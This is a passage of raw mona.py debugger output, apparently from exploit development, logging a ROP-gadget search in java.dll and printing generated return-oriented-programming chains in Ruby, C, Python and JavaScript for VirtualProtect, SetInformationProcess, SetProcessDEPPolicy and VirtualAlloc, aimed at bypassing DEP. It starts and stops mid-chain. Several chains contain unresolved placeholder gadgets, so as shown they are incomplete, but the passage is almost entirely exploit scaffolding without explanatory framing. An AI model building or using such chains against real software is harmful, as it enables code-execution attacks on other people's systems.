              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into esi
              "%u408c%u6d1d" + // 0x6d1d408c : ,# ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
              "%u217a%u6d32" + // 0x6d32217a : ,# POP EBP # RETN [zip.dll] 
              "%u0000%u0000" + // 0x00000000 : ,# &[Unable to find ptr to 'JMP ESP']
              "%u768f%u6d32" + // 0x6d32768f : ,# POP EBX # RETN [zip.dll] 
              "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadget to put 00001000 into edx
              "%u3400%u6d32" + // 0x6d323400 : ,# POP ECX # RETN [zip.dll] 
              "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
              "%u7ab6%u6d32" + // 0x6d327ab6 : ,# POP EDI # POP ESI # POP EBP # RETN [zip.dll] 
              "%u4c9c%u6d32" + // 0x6d324c9c : ,# RETN (ROP NOP) [zip.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4c9b%u6d32" + // 0x6d324c9b : ,# POP EAX # RETN [zip.dll] 
              "%u9090%u9090" + // 0x90909090 : ,# nop
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
0BADF00D      ROP generator finished
0BADF00D  
0BADF00D  [+] Writing stackpivots to file stackpivot.txt
0BADF00D      Wrote 138 pivots to file 
0BADF00D  [+] Writing suggestions to file rop_suggestions.txt
0BADF00D      Wrote 86 suggestions to file
0BADF00D  [+] Writing results to file rop.txt (303 interesting gadgets)
0BADF00D      Wrote 303 interesting gadgets to file
0BADF00D  [+] Writing other gadgets to file rop.txt (462 gadgets)
0BADF00D      Wrote 462 other gadgets to file
0BADF00D  Done
0BADF00D  
0BADF00D  [+] This mona.py action took 0:00:29.937000
0BADF00D  [+] Command used:
0BADF00D  !mona rop -m java.dll
          
          ---------- Mona command started on 2018-10-30 04:46:09 (v2.0, rev 577) ----------
0BADF00D  [+] Processing arguments and criteria
0BADF00D      - Pointer access level : X
0BADF00D      - Only querying modules java.dll
0BADF00D  [+] Generating module info table, hang on...
0BADF00D      - Processing modules
0BADF00D      - Done. Let's rock 'n roll.
0BADF00D  [+] Preparing output file '_rop_progress_ovas.exe_29032.log'
0BADF00D      - (Re)setting logfile _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Progress will be written to _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Maximum offset : 40
0BADF00D  [+] (Minimum/optional maximum) stackpivot distance : 8
0BADF00D  [+] Max nr of instructions : 6
0BADF00D  [+] Split output into module rop files ? False
0BADF00D  [+] Enumerating 22 endings in 1 module(s)...
0BADF00D      - Querying module java.dll
0BADF00D      - Search complete :
0BADF00D         Ending : RETN 0x0C, Nr found : 75
0BADF00D         Ending : RETN 0x1C, Nr found : 6
0BADF00D         Ending : RETN, Nr found : 147
0BADF00D         Ending : RETN 0x20, Nr found : 1
0BADF00D         Ending : RETN 0x18, Nr found : 6
0BADF00D         Ending : RETN 0x08, Nr found : 76
0BADF00D         Ending : RETN 0x10, Nr found : 47
0BADF00D         Ending : RETN 0x00, Nr found : 3
0BADF00D         Ending : RETN 0x14, Nr found : 24
0BADF00D         Ending : RETN 0x04, Nr found : 4
0BADF00D      - Filtering and mutating 389 gadgets
0BADF00D        - Progress update : 100 / 389 items processed (Tue 2018/10/30 04:46:10 AM) - (25%)
0BADF00D        - Progress update : 200 / 389 items processed (Tue 2018/10/30 04:46:11 AM) - (51%)
0BADF00D        - Progress update : 300 / 389 items processed (Tue 2018/10/30 04:46:11 AM) - (77%)
0BADF00D        - Progress update : 389 / 389 items processed (Tue 2018/10/30 04:46:12 AM) - (100%)
0BADF00D  [+] Creating suggestions list
0BADF00D  [+] Processing suggestions
0BADF00D  [+] Launching ROP generator
0BADF00D  [+] Attempting to produce rop chain for VirtualProtect
0BADF00D      Tue 2018/10/30 04:46:12 AM: Step 1/7: esi
0BADF00D  [+] Searching from 0x6d210000 to 0x6d228000
0BADF00D      Tue 2018/10/30 04:46:13 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:46:13 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:46:13 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:46:13 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:46:13 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:46:13 AM: Step 7/7: eax
0BADF00D  [+] Attempting to produce rop chain for SetInformationProcess
0BADF00D      Tue 2018/10/30 04:46:13 AM: Step 1/6: ebp
0BADF00D      Tue 2018/10/30 04:46:14 AM: Step 2/6: edx
0BADF00D      Tue 2018/10/30 04:46:14 AM: Step 3/6: ecx
0BADF00D      Tue 2018/10/30 04:46:14 AM: Step 4/6: ebx
0BADF00D      Tue 2018/10/30 04:46:14 AM: Step 5/6: eax
0BADF00D      Tue 2018/10/30 04:46:14 AM: Step 6/6: edi
0BADF00D  [+] Attempting to produce rop chain for SetProcessDEPPolicy
0BADF00D      Tue 2018/10/30 04:46:14 AM: Step 1/3: ebp
0BADF00D      Tue 2018/10/30 04:46:16 AM: Step 2/3: ebx
0BADF00D      Tue 2018/10/30 04:46:16 AM: Step 3/3: edi
0BADF00D  [+] Attempting to produce rop chain for VirtualAlloc
0BADF00D      Tue 2018/10/30 04:46:16 AM: Step 1/7: esi
0BADF00D  [+] Searching from 0x6d210000 to 0x6d228000
0BADF00D      Tue 2018/10/30 04:46:18 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:46:19 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:46:19 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:46:19 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:46:19 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:46:19 AM: Step 7/7: eax
0BADF00D  [+] ROP chains written to file rop_chains.txt
          
          ################################################################################
          
          Register setup for VirtualProtect() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualProtect()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualProtect()
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
          ----------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x6d219679,  # POP EBP # RETN [java.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x6d217fab,  # POP EBX # RETN [java.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x6d216054,  # POP EBX # RETN [java.dll] 
                0x00000040,  # 0x00000040-> edx
                0x00000000,  # [-] Unable to find a gadget to clear edx
                0x6d21cdbe,  # ADD EDX,EBX # POP EBX # RETN 0x10 [java.dll] 
                0x41414141,  # Filler (compensate)
                0x6d212ae8,  # POP ECX # RETN 0x10 [java.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d226291,  # &Writable location [java.dll]
                0x6d21ced6,  # POP EDI # RETN 0x10 [java.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d217fc3,  # RETN (ROP NOP) [java.dll]
                0x6d217dd7,  # POP EAX # RETN [java.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d3f8098,  // ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x6d219679,  // POP EBP // RETN [java.dll] 
                0x00000000,  // &  [Unable to find ptr to 'JMP ESP']
                0x6d217fab,  // POP EBX // RETN [java.dll] 
                0x00000201,  // 0x00000201-> ebx
                0x6d216054,  // POP EBX // RETN [java.dll] 
                0x00000040,  // 0x00000040-> edx
                0x00000000,  // [-] Unable to find a gadget to clear edx
                0x6d21cdbe,  // ADD EDX,EBX // POP EBX // RETN 0x10 [java.dll] 
                0x41414141,  // Filler (compensate)
                0x6d212ae8,  // POP ECX // RETN 0x10 [java.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x6d226291,  // &Writable location [java.dll]
                0x6d21ced6,  // POP EDI // RETN 0x10 [java.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x6d217fc3,  // RETN (ROP NOP) [java.dll]
                0x6d217dd7,  // POP EAX // RETN [java.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x90909090,  // nop
                0x00000000,  // [-] Unable to find pushad gadget
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x6d219679,  # POP EBP # RETN [java.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x6d217fab,  # POP EBX # RETN [java.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x6d216054,  # POP EBX # RETN [java.dll] 
                0x00000040,  # 0x00000040-> edx
                0x00000000,  # [-] Unable to find a gadget to clear edx
                0x6d21cdbe,  # ADD EDX,EBX # POP EBX # RETN 0x10 [java.dll] 
                0x41414141,  # Filler (compensate)
                0x6d212ae8,  # POP ECX # RETN 0x10 [java.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d226291,  # &Writable location [java.dll]
                0x6d21ced6,  # POP EDI # RETN 0x10 [java.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d217fc3,  # RETN (ROP NOP) [java.dll]
                0x6d217dd7,  # POP EAX # RETN [java.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into esi
              "%u8098%u6d3f" + // 0x6d3f8098 : ,# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
              "%u9679%u6d21" + // 0x6d219679 : ,# POP EBP # RETN [java.dll] 
              "%u0000%u0000" + // 0x00000000 : ,# &[Unable to find ptr to 'JMP ESP']
              "%u7fab%u6d21" + // 0x6d217fab : ,# POP EBX # RETN [java.dll] 
              "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
              "%u6054%u6d21" + // 0x6d216054 : ,# POP EBX # RETN [java.dll] 
              "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find a gadget to clear edx
              "%ucdbe%u6d21" + // 0x6d21cdbe : ,# ADD EDX,EBX # POP EBX # RETN 0x10 [java.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2ae8%u6d21" + // 0x6d212ae8 : ,# POP ECX # RETN 0x10 [java.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u6291%u6d22" + // 0x6d226291 : ,# &Writable location [java.dll]
              "%uced6%u6d21" + // 0x6d21ced6 : ,# POP EDI # RETN 0x10 [java.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u7fc3%u6d21" + // 0x6d217fc3 : ,# RETN (ROP NOP) [java.dll]
              "%u7dd7%u6d21" + // 0x6d217dd7 : ,# POP EAX # RETN [java.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u9090%u9090" + // 0x90909090 : ,# nop
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetInformationProcess() :
          --------------------------------------------
           EAX = SizeOf(ExecuteFlags) (0x4)
           ECX = &ExecuteFlags (ptr to 0x00000002)
           EDX = ProcessExecuteFlags (0x22)
           EBX = NtCurrentProcess (0xffffffff)
           ESP = ReturnTo (automatic)
           EBP = ptr to NtSetInformationProcess()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
          ---------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  # [-] Unable to find ptr to &SetInformationProcess()
                0x6d2146af,  # POP EBX # RETN [java.dll] 
                0x00000022,  # 0x00000022-> edx
                0x00000000,  # [-] Unable to find a gadget to clear edx
                0x6d21cdbe,  # ADD EDX,EBX # POP EBX # RETN 0x10 [java.dll] 
                0x41414141,  # Filler (compensate)
                0x6d212ae8,  # POP ECX # RETN 0x10 [java.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d210134,  # &0x00000002 [java.dll]
                0x6d216054,  # POP EBX # RETN [java.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0xffffffff,  # 0xffffffff-> ebx
                0x6d217dd7,  # POP EAX # RETN [java.dll] 
                0x00000004,  # 0x00000004-> eax
                0x6d21ced6,  # POP EDI # RETN 0x10 [java.dll] 
                0x6d21ced6,  # skip 4 bytes [java.dll]
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  // [-] Unable to find ptr to &SetInformationProcess()
                0x6d2146af,  // POP EBX // RETN [java.dll] 
                0x00000022,  // 0x00000022-> edx
                0x00000000,  // [-] Unable to find a gadget to clear edx
                0x6d21cdbe,  // ADD EDX,EBX // POP EBX // RETN 0x10 [java.dll] 
                0x41414141,  // Filler (compensate)
                0x6d212ae8,  // POP ECX // RETN 0x10 [java.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x6d210134,  // &0x00000002 [java.dll]
                0x6d216054,  // POP EBX // RETN [java.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0xffffffff,  // 0xffffffff-> ebx
                0x6d217dd7,  // POP EAX // RETN [java.dll] 
                0x00000004,  // 0x00000004-> eax
                0x6d21ced6,  // POP EDI // RETN 0x10 [java.dll] 
                0x6d21ced6,  // skip 4 bytes [java.dll]
                0x00000000,  // [-] Unable to find pushad gadget
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into ebp
                0x00000000,  # [-] Unable to find ptr to &SetInformationProcess()
                0x6d2146af,  # POP EBX # RETN [java.dll] 
                0x00000022,  # 0x00000022-> edx
                0x00000000,  # [-] Unable to find a gadget to clear edx
                0x6d21cdbe,  # ADD EDX,EBX # POP EBX # RETN 0x10 [java.dll] 
                0x41414141,  # Filler (compensate)
                0x6d212ae8,  # POP ECX # RETN 0x10 [java.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d210134,  # &0x00000002 [java.dll]
                0x6d216054,  # POP EBX # RETN [java.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0xffffffff,  # 0xffffffff-> ebx
                0x6d217dd7,  # POP EAX # RETN [java.dll] 
                0x00000004,  # 0x00000004-> eax
                0x6d21ced6,  # POP EDI # RETN 0x10 [java.dll] 
                0x6d21ced6,  # skip 4 bytes [java.dll]
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into ebp
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to &SetInformationProcess()
              "%u46af%u6d21" + // 0x6d2146af : ,# POP EBX # RETN [java.dll] 
              "%u0022%u0000" + // 0x00000022 : ,# 0x00000022-> edx
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find a gadget to clear edx
              "%ucdbe%u6d21" + // 0x6d21cdbe : ,# ADD EDX,EBX # POP EBX # RETN 0x10 [java.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u2ae8%u6d21" + // 0x6d212ae8 : ,# POP ECX # RETN 0x10 [java.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u0134%u6d21" + // 0x6d210134 : ,# &0x00000002 [java.dll]
              "%u6054%u6d21" + // 0x6d216054 : ,# POP EBX # RETN [java.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
              "%u7dd7%u6d21" + // 0x6d217dd7 : ,# POP EAX # RETN [java.dll] 
              "%u0004%u0000" + // 0x00000004 : ,# 0x00000004-> eax
              "%uced6%u6d21" + // 0x6d21ced6 : ,# POP EDI # RETN 0x10 [java.dll] 
              "%uced6%u6d21" + // 0x6d21ced6 : ,# skip 4 bytes [java.dll]
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetProcessDEPPolicy() :
          --------------------------------------------
           EAX = <not used>
           ECX = <not used>
           EDX = <not used>
           EBX = dwFlags (ptr to 0x00000000)
           ESP = ReturnTo (automatic)
           EBP = ptr to SetProcessDEPPolicy()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
          ---------------------------------------------------------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d216054,  # POP EBX # RETN [java.dll] 
                0x6d210011,  # &0x00000000 [java.dll]
                0x6d21ced6,  # POP EDI # RETN 0x10 [java.dll] 
                0x6d21ced6,  # skip 4 bytes [java.dll]
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d216054,  // POP EBX // RETN [java.dll] 
                0x6d210011,  // &0x00000000 [java.dll]
                0x6d21ced6,  // POP EDI // RETN 0x10 [java.dll] 
                0x6d21ced6,  // skip 4 bytes [java.dll]
                0x00000000,  // [-] Unable to find pushad gadget
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x6d216054,  # POP EBX # RETN [java.dll] 
                0x6d210011,  # &0x00000000 [java.dll]
                0x6d21ced6,  # POP EDI # RETN 0x10 [java.dll] 
                0x6d21ced6,  # skip 4 bytes [java.dll]
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
              "%u6054%u6d21" + // 0x6d216054 : ,# POP EBX # RETN [java.dll] 
              "%u0011%u6d21" + // 0x6d210011 : ,# &0x00000000 [java.dll]
              "%uced6%u6d21" + // 0x6d21ced6 : ,# POP EDI # RETN 0x10 [java.dll] 
              "%uced6%u6d21" + // 0x6d21ced6 : ,# skip 4 bytes [java.dll]
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for VirtualAlloc() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualAlloc()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualAlloc()
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
          --------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
